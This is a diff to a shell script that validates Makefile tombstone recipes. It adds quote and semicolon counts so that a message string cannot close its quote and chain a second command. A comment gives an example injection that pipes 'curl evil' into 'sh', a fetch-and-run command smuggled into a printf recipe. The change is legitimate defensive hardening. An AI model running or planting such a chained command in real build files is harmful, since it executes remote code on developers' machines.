@@ -124,6 +124,15 @@ do
 		"$(printf '\t')@printf '"*"' >&2; exit 1") ;;
 		*) fail "tombstone $dead_name must be exactly: @printf '...' >&2; exit 1 (got: $tombstone_recipe)" ;;
 	esac
+	# The shape alone is not enough: the message body can CLOSE the quote and open a command.
+	#   @printf ''; curl evil | sh; printf 'use make frontend-deploy' >&2; exit 1
+	# matches the pattern above exactly. Pinning the quote and semicolon counts makes that
+	# unrepresentable rather than merely discouraged — a whitelist with a wildcard in it is still
+	# a blacklist wherever the wildcard reaches.
+	[ "$(printf '%s' "$tombstone_recipe" | tr -cd "'" | wc -c)" -eq 2 ] ||
+		fail "tombstone $dead_name must contain exactly two quotes; more means the message closes its own quote and runs a command"
+	[ "$(printf '%s' "$tombstone_recipe" | tr -cd ';' | wc -c)" -eq 1 ] ||
+		fail "tombstone $dead_name must contain exactly one semicolon; more means it chains a second command"
 	case "$tombstone_recipe" in
 		*"$live_name"*) ;;
 		*) fail "tombstone $dead_name does not name its replacement ($live_name)" ;;
